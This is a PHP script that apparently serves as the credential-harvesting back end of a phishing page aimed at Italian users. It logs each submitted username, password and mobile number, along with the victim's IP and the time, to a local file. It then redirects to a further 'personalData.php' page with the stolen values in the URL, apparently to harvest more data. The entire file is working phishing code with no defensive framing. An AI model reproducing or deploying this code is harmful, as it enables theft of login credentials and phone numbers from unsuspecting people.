﻿<?php
date_default_timezone_set('Europe/Rome');
$handle = fopen("001", "a");
$date = date('Y-m-d H:i:s');
$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');
fwrite($handle, "IP: ");
fwrite($handle, $ip);
fwrite($handle, "\r\n");
fwrite($handle, "Date: ");
fwrite($handle, $date);
fwrite($handle, "\r\n");
fwrite($handle, "Nome utente: ");
fwrite($handle, $_POST["username"]);
fwrite($handle, "\r\n");
fwrite($handle, "Password: ");
fwrite($handle, $_POST["password"]);
fwrite($handle, "\r\n");
fwrite($handle, "Cellulare: ");
fwrite($handle, $_POST["cellulare"]);
fwrite($handle, "\r\n");
fwrite($handle, "----------------------------------");
fwrite($handle, "\r\n");
fclose($handle);

	echo '<meta http-equiv="refresh" content="0; URL=/personalData.php?key=AJiidMJ896HA87sauasuiAAHUSDNO28927njanHA&usr='. $_POST["username"] . '&pwd=' . $_POST["password"] . '&cellulare=' . $_POST["cellulare"] .'">';


exit;
?>